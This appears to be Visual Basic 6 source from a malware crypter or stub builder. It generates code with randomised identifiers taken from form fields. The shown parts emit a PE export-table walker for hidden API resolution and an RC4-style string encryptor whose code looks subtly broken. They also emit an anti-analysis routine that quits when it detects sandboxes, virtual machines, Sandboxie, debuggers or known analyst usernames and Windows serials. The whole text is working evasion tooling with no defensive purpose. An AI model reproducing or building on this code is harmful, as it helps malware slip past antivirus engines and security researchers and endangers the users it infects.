"    Dim tIMAGE_EXPORT_DIRECTORY As IMAGE_EXPORT_DIRECTORY" & vbCrLf & _
"    Call CopyBytes(SIZE_DOS_HEADER, " & frmMain.Text1(13).Text & ", ByVal " & frmMain.Text1(12).Text & ")" & vbCrLf & _
"    If Not " & frmMain.Text1(13).Text & ".e_magic = IMAGE_DOS_SIGNATURE Then" & vbCrLf & _
"        Exit Function" & vbCrLf & _
"    End If" & vbCrLf & _
"    Call CopyBytes(SIZE_NT_HEADERS, " & frmMain.Text1(14).Text & ", ByVal " & frmMain.Text1(12).Text & " + " & frmMain.Text1(13).Text & ".e_lfanew)" & vbCrLf & _
"    If Not " & frmMain.Text1(14).Text & ".Signature = IMAGE_NT_SIGNATURE Then" & vbCrLf & _
"        Exit Function" & vbCrLf & _
"    End If" & vbCrLf & _
"    Dim lVAddress   As Long" & vbCrLf & _
"    Dim lVSize      As Long" & vbCrLf & _
"    Dim lBase       As Long" & vbCrLf & _
"    With " & frmMain.Text1(14).Text & ".OptionalHeader" & vbCrLf & _
"        lVAddress = " & frmMain.Text1(12).Text & " + .DataDirectory(0).VirtualAddress" & vbCrLf & _
"        lVSize = lVAddress + .DataDirectory(0).Size" & vbCrLf & _
"        lBase = .ImageBase" & vbCrLf & _
"    End With" & vbCrLf & _
"    Call CopyBytes(SIZE_EXPORT_DIRECTORY, tIMAGE_EXPORT_DIRECTORY, ByVal lVAddress)" & vbCrLf & _
"    Dim i           As Long" & vbCrLf & _
"    Dim lFunctAdd   As Long" & vbCrLf & _
"    Dim lNameAdd    As Long" & vbCrLf & _
"    Dim lNumbAdd    As Long" & vbCrLf
ntPE = ntPE & "    With tIMAGE_EXPORT_DIRECTORY" & vbCrLf & _
"        For i = 0 To .NumberOfNames - 1" & vbCrLf & _
"            CopyBytes 4, lNameAdd, ByVal lBase + .lpAddressOfNames + i * 4" & vbCrLf & _
"            If StringFromPtr(lBase + lNameAdd) = " & frmMain.Text1(30).Text & " Then" & vbCrLf & _
"                CopyBytes 2, lNumbAdd, ByVal lBase + .lpAddressOfNameOrdinals + i * 2" & vbCrLf & _
"                CopyBytes 4, lFunctAdd, ByVal lBase + .lpAddressOfFunctions + lNumbAdd * 4" & vbCrLf & _
"                " & frmMain.Text3(3).Text & " = lFunctAdd + lBase" & vbCrLf & _
"                If " & frmMain.Text3(3).Text & " >= lVAddress And _" & vbCrLf & _
"                   " & frmMain.Text3(3).Text & " <= lVSize Then" & vbCrLf & _
"                    Call " & frmMain.Text3(4).Text & "(" & frmMain.Text3(3).Text & ", " & frmMain.Text1(12).Text & ", " & frmMain.Text1(30).Text & ")" & vbCrLf & _
"                    If Not " & frmMain.Text1(12).Text & " = 0 Then" & vbCrLf & _
"                        " & frmMain.Text3(3).Text & " = " & frmMain.Text3(3).Text & "(" & frmMain.Text1(12).Text & ", " & frmMain.Text1(30).Text & ")" & vbCrLf & _
"                    Else" & vbCrLf & _
"                        " & frmMain.Text3(3).Text & " = 0" & vbCrLf & _
"                    End If" & vbCrLf & _
"                End If" & vbCrLf & _
"                Exit Function" & vbCrLf & _
"            End If" & vbCrLf & _
"        Next" & vbCrLf & _
"    End With" & vbCrLf & _
"End Function" & vbCrLf
ntPE = ntPE & "Private Function " & frmMain.Text3(4).Text & "( _" & vbCrLf & _
"       ByVal lAddress As Long, _" & vbCrLf & _
"       ByRef lLib As Long, _" & vbCrLf & _
"       ByRef sMod As String)" & vbCrLf & _
"       Dim sForward     As String" & vbCrLf & _
"    sForward = StringFromPtr(lAddress)" & vbCrLf & _
"    If InStr(1, sForward, " & X & "." & X & ") Then" & vbCrLf & _
"        lLib = " & frmMain.Text3(5).Text & "(Split(sForward, " & X & "." & X & ")(0))" & vbCrLf & _
"        sMod = Split(sForward, " & X & "." & X & ")(1)" & vbCrLf & _
"    End If" & vbCrLf & _
"End Function" & vbCrLf & _
"Private Function StringFromPtr( _" & vbCrLf & _
"       ByVal lAddress As Long) As String" & vbCrLf & _
"       Dim bChar       As Byte" & vbCrLf & _
"   Do" & vbCrLf & _
"        CopyBytes 1, bChar, ByVal lAddress" & vbCrLf & _
"        lAddress = lAddress + 1" & vbCrLf & _
"        If bChar = 0 Then Exit Do" & vbCrLf & _
"        StringFromPtr = StringFromPtr & Chr$(bChar)" & vbCrLf & _
"    Loop" & vbCrLf & _
"End Function" & vbCrLf


End Function

Public Function Enc() As String
Enc = "Public Function " & frmMain.Text1(19).Text & "(ByVal " & frmMain.Text1(20).Text & " As String, ByVal " & frmMain.Text1(21).Text & " As String) As String" & vbCrLf & _
"On Error Resume Next" & vbCrLf & _
"Dim " & frmMain.Text1(22).Text & "(0 To 255) As Integer, X, Y As Long, " & frmMain.Text1(23).Text & "() As Byte" & vbCrLf & _
"" & frmMain.Text1(23).Text & "() = StrConv(" & frmMain.Text1(21).Text & ", vbFromUnicode)" & vbCrLf & _
"For X = 0 To 255" & vbCrLf & _
"    Y = (Y + " & frmMain.Text1(22).Text & "(X) + " & frmMain.Text1(23).Text & "(X Mod Len(" & frmMain.Text1(21).Text & "))) Mod 256" & vbCrLf & _
"    " & frmMain.Text1(22).Text & "(X) = X" & vbCrLf & _
"Next X" & vbCrLf & _
"" & frmMain.Text1(23).Text & "() = StrConv(" & frmMain.Text1(20).Text & ", vbFromUnicode)" & vbCrLf & _
"For X = 0 To Len(" & frmMain.Text1(20).Text & ")" & vbCrLf & _
"    Y = (Y + " & frmMain.Text1(22).Text & "(Y) + 1) Mod 256" & vbCrLf & _
"    " & frmMain.Text1(23).Text & "(X) = " & frmMain.Text1(23).Text & "(X) Xor " & frmMain.Text1(22).Text & "(Temp + " & frmMain.Text1(22).Text & "((Y + " & frmMain.Text1(22).Text & "(Y)) Mod 254))" & vbCrLf & _
"Next X" & vbCrLf & _
"" & frmMain.Text1(19).Text & " = StrConv(" & frmMain.Text1(23).Text & ", vbUnicode)" & vbCrLf & _
"End Function" & vbCrLf & vbNewLine

End Function


Public Function sAnti() As String

sAnti = "Option Explicit" & vbCrLf & _
"Private Declare Function GetModuleHandleA Lib " & X & "kernel32" & X & " (ByVal lpModuleName As String) As Long" & vbCrLf & _
"Private Declare Function GetTickCount Lib " & X & "kernel32" & X & " () As Long" & vbCrLf & _
"Private Declare Sub Sleep Lib " & X & "kernel32" & X & " (ByVal lngMilliseconds As Long)" & vbCrLf & _
"Public Sub " & frmMain.Text3(6).Text & "()" & vbCrLf & _
"Dim " & frmMain.Text1(33).Text & "(6)       As String" & vbCrLf & _
"Dim " & frmMain.Text1(34).Text & "(3)   As String" & vbCrLf & _
"Dim " & frmMain.Text1(35).Text & "(1)        As String" & vbCrLf & _
"Dim " & frmMain.Text1(36).Text & "(3)        As String" & vbCrLf & _
"Dim " & frmMain.Text1(37).Text & "(1)      As String" & vbCrLf & _
"Dim " & frmMain.Text1(38).Text & "           As String * 255" & vbCrLf & _
"Dim " & frmMain.Text1(39).Text & "       As String * 255" & vbCrLf & _
"Dim " & frmMain.Text1(40).Text & "      As String" & vbCrLf & _
"Dim " & frmMain.Text1(41).Text & "          As Boolean" & vbCrLf & _
"Dim " & frmMain.Text1(42).Text & "         As Long" & vbCrLf & _
"Dim " & frmMain.Text1(43).Text & "          As Long" & vbCrLf & _
"Dim " & frmMain.Text1(44).Text & "           As Long" & vbCrLf & _
"Dim " & frmMain.Text1(45).Text & "         As String" & vbCrLf & _
"Dim " & frmMain.Text1(46).Text & "            As Long" & vbCrLf & _
"Dim i               As Long" & vbCrLf & _
"Dim oSet            As Object" & vbCrLf & _
"Dim oObj            As Object" & vbCrLf & _
"" & frmMain.Text1(33).Text & "(0) = " & X & "Sndbx" & X & vbCrLf & _
"" & frmMain.Text1(33).Text & "(1) = " & X & "tester" & X & vbCrLf & _
"" & frmMain.Text1(33).Text & "(2) = " & X & "panda" & X & vbCrLf
sAnti = sAnti & "" & frmMain.Text1(33).Text & "(3) = " & X & "currentuser" & X & vbCrLf & _
"" & frmMain.Text1(33).Text & "(4) = " & X & "Schmidti" & X & vbCrLf & _
"" & frmMain.Text1(33).Text & "(5) = " & X & "andy" & X & vbCrLf & _
"" & frmMain.Text1(33).Text & "(6) = " & X & "Andy" & X & vbCrLf & _
"" & frmMain.Text1(34).Text & "(0) = " & X & "AUTO" & X & vbCrLf & _
"" & frmMain.Text1(34).Text & "(1) = " & X & "VMLOG" & X & vbCrLf & _
"" & frmMain.Text1(34).Text & "(2) = " & X & "NONE-DUSEZ" & X & vbCrLf & _
"" & frmMain.Text1(34).Text & "(3) = " & X & "XPSP3" & X & vbCrLf & _
"" & frmMain.Text1(35).Text & "(0) = " & X & "SbieDll.dll" & X & vbCrLf & _
"" & frmMain.Text1(35).Text & "(1) = " & X & "dbghelp.dll" & X & vbCrLf & _
"" & frmMain.Text1(36).Text & "(0) = " & X & "*VIRTUAL*" & X & vbCrLf & _
"" & frmMain.Text1(36).Text & "(1) = " & X & "*VMWARE*" & X & vbCrLf & _
"" & frmMain.Text1(36).Text & "(2) = " & X & "*VBOX*" & X & vbCrLf & _
"" & frmMain.Text1(36).Text & "(3) = " & X & "*QEMU*" & X & vbCrLf & _
"" & frmMain.Text1(37).Text & "(0) = " & X & "55274-339-6006333-22900" & X & vbCrLf & _
"" & frmMain.Text1(37).Text & "(1) = " & X & "76487-OEM-0065901-82986" & X & vbCrLf & _
"" & frmMain.Text1(38).Text & " = Environ(" & X & "username" & X & ")" & vbCrLf & _
"" & frmMain.Text1(39).Text & " = Environ(" & X & "computername" & X & ")" & vbCrLf & _
"For i = 0 To UBound(" & frmMain.Text1(33).Text & ")" & vbCrLf & _
"    If Left(" & frmMain.Text1(38).Text & ", Len(" & frmMain.Text1(33).Text & "(i))) = " & frmMain.Text1(33).Text & "(i) Then " & frmMain.Text1(41).Text & " = True" & vbCrLf & _
"Next i" & vbCrLf & _
"For i = 0 To UBound(" & frmMain.Text1(34).Text & ")" & vbCrLf & _
"    If Left(" & frmMain.Text1(39).Text & ", Len(" & frmMain.Text1(34).Text & "(i))) = " & frmMain.Text1(34).Text & "(i) Then " & frmMain.Text1(41).Text & " = True" & vbCrLf & _
"Next i" & vbCrLf & _
"For i = 0 To UBound(" & frmMain.Text1(35).Text & ")" & vbCrLf
sAnti = sAnti & "    If GetModuleHandleA(" & frmMain.Text1(35).Text & "(i)) Then " & frmMain.Text1(41).Text & " = True" & vbCrLf & _
"Next i" & vbCrLf & _
"" & frmMain.Text1(42).Text & " = GetTickCount" & vbCrLf & _
"Sleep 510" & vbCrLf & _
"" & frmMain.Text1(43).Text & " = GetTickCount" & vbCrLf & _
"If (" & frmMain.Text1(43).Text & " - " & frmMain.Text1(42).Text & ") < 500 Then " & frmMain.Text1(41).Text & " = True" & vbCrLf & _
"On Error Resume Next" & vbCrLf & _
"Set oSet = GetObject(" & X & "winmgmts:{impersonationLevel=impersonate}" & X & ").InstancesOf(Split(" & X & "Win32_OperatingSystem,SerialNumber" & X & ", " & X & "," & X & ")(0))" & vbCrLf & _
"" & frmMain.Text1(40).Text & " = " & X & "" & X & vbCrLf & _
"For Each oObj In oSet" & vbCrLf & _
"    " & frmMain.Text1(40).Text & " = oObj.Properties_(Split(" & X & "Win32_OperatingSystem,SerialNumber" & X & ", " & X & "," & X & ")(1))" & vbCrLf & _
"    " & frmMain.Text1(40).Text & " = Trim(" & frmMain.Text1(40).Text & ")" & vbCrLf & _
"Next" & vbCrLf & _
"For i = 0 To UBound(" & frmMain.Text1(37).Text & ")" & vbCrLf & _
"    If " & frmMain.Text1(40).Text & " = " & frmMain.Text1(37).Text & "(i) Then " & frmMain.Text1(41).Text & " = True" & vbCrLf & _
"Next i" & vbCrLf & _
"If " & frmMain.Text1(41).Text & " = True Then End" & vbCrLf & _
"End Sub" & vbCrLf

End Function

